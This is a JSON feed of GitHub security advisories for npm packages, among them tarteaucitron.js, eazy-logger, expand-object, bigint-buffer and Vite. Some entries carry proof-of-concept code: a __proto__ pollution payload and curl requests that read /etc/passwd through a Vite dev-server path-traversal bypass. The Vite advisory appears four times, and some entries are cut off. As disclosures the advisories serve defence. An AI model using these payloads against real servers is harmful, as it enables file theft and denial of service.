{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>A vulnerability was identified in <code>tarteaucitron.js</code>, allowing a user with high privileges (access to the site's source code or a CMS plugin) to enter a URL containing an insecure scheme such as <code>javascript:alert()</code>. Before the fix, URL validation was insufficient, which could allow arbitrary JavaScript execution if a user clicked on a malicious link.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>An attacker with high privileges could insert a link exploiting an insecure URL scheme, leading to:</p>\n<ul>\n<li>Execution of arbitrary JavaScript code</li>\n<li>Theft of sensitive data through phishing attacks</li>\n<li>Modification of the user interface behavior</li>\n</ul>\n<h2 id=\"fix-httpsgithubcomamaurictarteaucitronjscommit2fa1e01023bce2e4b813200600bb1619d56ceb02\">Fix <a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02\">https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02</a></h2>\n<p>The issue was resolved by enforcing strict URL validation, ensuring that they start with <code>http://</code> or <code>https://</code> before being used.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-p5g4-v748-6fh8\">https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-p5g4-v748-6fh8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31476\">https://nvd.nist.gov/vuln/detail/CVE-2025-31476</a></li>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02\">https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p5g4-v748-6fh8\">https://github.com/advisories/GHSA-p5g4-v748-6fh8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p5g4-v748-6fh8",
            "title": "[tarteaucitronjs] tarteaucitron.js allows url scheme injection via unfiltered inputs",
            "date_modified": "2025-04-07T16:47:00.000Z",
            "date_published": "2025-04-07T16:46:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p5g4-v748-6fh8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was identified in <code>tarteaucitron.js</code>, where the <code>addOrUpdate</code> function, used for applying custom texts, did not properly validate input. This allowed an attacker with direct access to the site's source code or a CMS plugin to manipulate JavaScript object prototypes, leading to potential security risks such as data corruption or unintended code execution.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>An attacker with high privileges could exploit this vulnerability to:</p>\n<ul>\n<li>Modify object prototypes, affecting core JavaScript behavior,</li>\n<li>Cause application crashes or unexpected behavior,</li>\n<li>Potentially introduce further security vulnerabilities depending on the application's architecture.</li>\n</ul>\n<h2 id=\"fix-httpsgithubcomamaurictarteaucitronjscommit74c354c413ee3f82dff97a15a0a43942887c2b5b\">Fix <a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b\">https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b</a></h2>\n<p>The issue was resolved by ensuring that user-controlled inputs cannot modify JavaScript object prototypes.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-4hwx-xcc5-2hfc\">https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-4hwx-xcc5-2hfc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31475\">https://nvd.nist.gov/vuln/detail/CVE-2025-31475</a></li>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b\">https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4hwx-xcc5-2hfc\">https://github.com/advisories/GHSA-4hwx-xcc5-2hfc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4hwx-xcc5-2hfc",
            "title": "[tarteaucitronjs] tarteaucitron.js allows prototype pollution via custom text injection",
            "date_modified": "2025-04-07T16:38:54.000Z",
            "date_published": "2025-04-07T16:38:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4hwx-xcc5-2hfc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was identified in <code>tarteaucitron.js</code>, where user-controlled inputs for element dimensions (<code>width</code> and <code>height</code>) were not properly validated. This allowed an attacker with direct access to the site's source code or a CMS plugin to set values like <code>100%;height:100%;position:fixed;</code>, potentially covering the entire viewport and facilitating clickjacking attacks.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>An attacker with high privileges could exploit this vulnerability to:</p>\n<ul>\n<li>Overlay malicious UI elements on top of legitimate content,</li>\n<li>Trick users into interacting with hidden elements (clickjacking),</li>\n<li>Disrupt the intended functionality and accessibility of the website.</li>\n</ul>\n<h2 id=\"fix-httpsgithubcomamaurictarteaucitronjscommit25fcf828aaa55306ddc09cfbac9a6f8f126e2d07\">Fix <a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07\">https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07</a></h2>\n<p>The issue was resolved by enforcing strict validation and sanitization of user-provided CSS values to prevent unintended UI manipulation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-7524-3396-fqv3\">https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-7524-3396-fqv3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31138\">https://nvd.nist.gov/vuln/detail/CVE-2025-31138</a></li>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07\">https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7524-3396-fqv3\">https://github.com/advisories/GHSA-7524-3396-fqv3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7524-3396-fqv3",
            "title": "[tarteaucitronjs] tarteaucitron.js allows UI manipulation via unrestricted CSS injection",
            "date_modified": "2025-04-07T16:38:25.000Z",
            "date_published": "2025-04-07T16:38:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7524-3396-fqv3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the lib.Logger function of eazy-logger v4.0.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<p>An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., <code>child_process.exec</code>, <code>eval</code>), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<pre><code class=\"language-js\">(async () =&gt; {\nconst lib = await import('eazy-logger');\nvar someObj = {}\nconsole.log(\"Before Attack: \", JSON.stringify({}.__proto__));\ntry {\n// for multiple functions, uncomment only one for each execution.\nlib.Logger (JSON.parse('{\"__proto__\":{\"pollutedKey\":123}}'))\n} catch (e) { }\nconsole.log(\"After Attack: \", JSON.stringify({}.__proto__));\ndelete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57075\">https://nvd.nist.gov/vuln/detail/CVE-2024-57075</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/c601f7f85146510ca899a7406a03aba5\">https://gist.github.com/tariqhawis/c601f7f85146510ca899a7406a03aba5</a></li>\n<li><a href=\"https://github.com/shakyShane/eazy-logger/commit/a8baa6fe441d19ffa9916eba367016b7937a28fd\">https://github.com/shakyShane/eazy-logger/commit/a8baa6fe441d19ffa9916eba367016b7937a28fd</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r7jx-5m6m-cpg9\">https://github.com/advisories/GHSA-r7jx-5m6m-cpg9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r7jx-5m6m-cpg9",
            "title": "[eazy-logger] eazy-logger prototype pollution",
            "date_modified": "2025-04-07T12:34:02.000Z",
            "date_published": "2025-02-06T06:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r7jx-5m6m-cpg9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package expand-object from 0.0.0 to 0.4.2 are vulnerable to Prototype Pollution in the expand() function in index.js. This function expands the given string into an object and allows a nested property to be set without checking the provided keys for sensitive properties like <strong>proto</strong>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3197\">https://nvd.nist.gov/vuln/detail/CVE-2025-3197</a></li>\n<li><a href=\"https://gist.github.com/miguelafmonteiro/d8f66af61d14e06338b688f90c4dfa7c\">https://gist.github.com/miguelafmonteiro/d8f66af61d14e06338b688f90c4dfa7c</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-EXPANDOBJECT-5821390\">https://security.snyk.io/vuln/SNYK-JS-EXPANDOBJECT-5821390</a></li>\n<li><a href=\"https://github.com/jonschlinkert/expand-object/blob/master/index.js#L13\">https://github.com/jonschlinkert/expand-object/blob/master/index.js#L13</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4vjr-hfpp-2m7w\">https://github.com/advisories/GHSA-4vjr-hfpp-2m7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4vjr-hfpp-2m7w",
            "title": "[expand-object] expand-object Vulnerable to Prototype Pollution via the expand() Function",
            "date_modified": "2025-04-04T18:24:06.000Z",
            "date_published": "2025-04-04T06:34:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4vjr-hfpp-2m7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package bigint-buffer from 0.0.0 to 1.1.5 are vulnerable to Buffer Overflow in the toBigIntLE() function. Attackers can exploit this to crash the application.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3194\">https://nvd.nist.gov/vuln/detail/CVE-2025-3194</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-BIGINTBUFFER-3364597\">https://security.snyk.io/vuln/SNYK-JS-BIGINTBUFFER-3364597</a></li>\n<li><a href=\"https://www.usenix.org/system/files/sec23fall-prepub-262_staicu.pdf\">https://www.usenix.org/system/files/sec23fall-prepub-262_staicu.pdf</a></li>\n<li><a href=\"https://github.com/no2chem/bigint-buffer/blob/master/src/index.ts#L25\">https://github.com/no2chem/bigint-buffer/blob/master/src/index.ts#L25</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3gc7-fjrx-p6mg\">https://github.com/advisories/GHSA-3gc7-fjrx-p6mg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3gc7-fjrx-p6mg",
            "title": "[bigint-buffer] bigint-buffer Vulnerable to Buffer Overflow via toBigIntLE() Function",
            "date_modified": "2025-04-04T18:23:46.000Z",
            "date_published": "2025-04-04T06:34:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3gc7-fjrx-p6mg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>All versions of the package react-draft-wysiwyg are vulnerable to Cross-site Scripting (XSS) via the Embedded button which will then result in saving the payload in the </p>",
            "url": "https://github.com/advisories/GHSA-fq5x-7292-2p5r",
            "title": "[react-draft-wysiwyg] React Draft Wysiwyg Cross-Site Scripting (XSS) via the Embedded Button",
            "date_modified": "2025-04-04T18:23:09.000Z",
            "date_published": "2025-04-04T06:34:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fq5x-7292-2p5r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href=\"https://vitejs.dev/config/server-options.html#server-host\">server.host config option</a>) are affected..</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"svg\"><code>.svg</code></h4>\n<p>Requests ending with <code>.svg</code> are loaded at this line.\n<a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>\nBy adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>\n<p>This bypass is only possible if the file is smaller than <a href=\"https://vite.dev/config/build-options.html#build-assetsinlinelimit\"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>\n<h4 id=\"relative-paths\">relative paths</h4>\n<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">npm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n</code></pre>\n<p>send request to read <code>etc/passwd</code></p>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n</code></pre>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31486\">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>\n<li><a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
            "title": "[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths",
            "date_modified": "2025-04-04T14:20:06.000Z",
            "date_published": "2025-04-04T14:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href=\"https://vitejs.dev/config/server-options.html#server-host\">server.host config option</a>) are affected..</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"svg\"><code>.svg</code></h4>\n<p>Requests ending with <code>.svg</code> are loaded at this line.\n<a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>\nBy adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>\n<p>This bypass is only possible if the file is smaller than <a href=\"https://vite.dev/config/build-options.html#build-assetsinlinelimit\"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>\n<h4 id=\"relative-paths\">relative paths</h4>\n<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">npm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n</code></pre>\n<p>send request to read <code>etc/passwd</code></p>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n</code></pre>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31486\">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>\n<li><a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
            "title": "[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths",
            "date_modified": "2025-04-04T14:20:06.000Z",
            "date_published": "2025-04-04T14:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href=\"https://vitejs.dev/config/server-options.html#server-host\">server.host config option</a>) are affected..</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"svg\"><code>.svg</code></h4>\n<p>Requests ending with <code>.svg</code> are loaded at this line.\n<a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>\nBy adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>\n<p>This bypass is only possible if the file is smaller than <a href=\"https://vite.dev/config/build-options.html#build-assetsinlinelimit\"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>\n<h4 id=\"relative-paths\">relative paths</h4>\n<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">npm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n</code></pre>\n<p>send request to read <code>etc/passwd</code></p>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n</code></pre>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31486\">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>\n<li><a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
            "title": "[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths",
            "date_modified": "2025-04-04T14:20:06.000Z",
            "date_published": "2025-04-04T14:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href=\"https://vitejs.dev/config/server-options.html#server-host\">server.host config option</a>) are affected..</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"svg\"><code>.svg</code></h4>\n<p>Requests ending with <code>.svg</code> are loaded at this line.\n<a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>\nBy adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>\n<p>This bypass is only possible if the file is smaller than <a href=\"https://vite.dev/config/build-options.html#build-assetsinlinelimit\"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>\n<h4 id=\"relative-paths\">relative paths</h4>\n<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">npm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n</code></pre>\n<p>send request to read <code>etc/passwd</code></p>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n</code></pre>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31486\">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>\n<li><a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
            "title": "[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths",
            "date_modified": "2025-04-04T14:20:06.000Z",
            "date_published": "2025-04-04T14:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href=\"https://vitejs.dev/config/server-options.html#server-host\">server.host config option</a>) are affected..</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"svg\"><code>.svg</code></h4>\n<p>Requests ending with <code>.svg</code> are loaded at this line.\n<a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>\nBy adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>\n<p>This bypass is only possible if the file is smaller than <a href=\"https://vite.dev/config/build-options.html#build-assetsinlinelimit\"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>\n<h4 id=\"relative-paths\">relative paths</h4>\n<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">npm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n</code></pre>\n<p>send request to read <code>etc/passwd</code></p>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n</code></pre>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31486\">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>\n<li><a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
            "title": "[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths",
            "date_modified": "2025-04-04T14:20:06.000Z",
            "date_published": "2025-04-04T14:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>CWE-470 (Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') when having Javers selected as Entity Audit Framework</p>\n<h3 id=\"details\">Details</h3>\n<p>In the following two occurences, user input directly leads to class loading without checking against e.g. a whitelist of allowed classes. This is also known as CWE-470\n<a href=\"https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L88\">https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L88</a>\n<a href=\"https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L124\">https://github.com/jhipster/generator-jhipster-entity-audit/blob/e21e83135d10c77d92203c89cb0b0063914e8fe0/generators/spring-boot-javers/templates/src/main/java/_package_/web/rest/JaversEntityAuditResource.java.ejs#L124</a></p>\n<p>So, if an attacker manages to place some malicious classes into the classpath and also 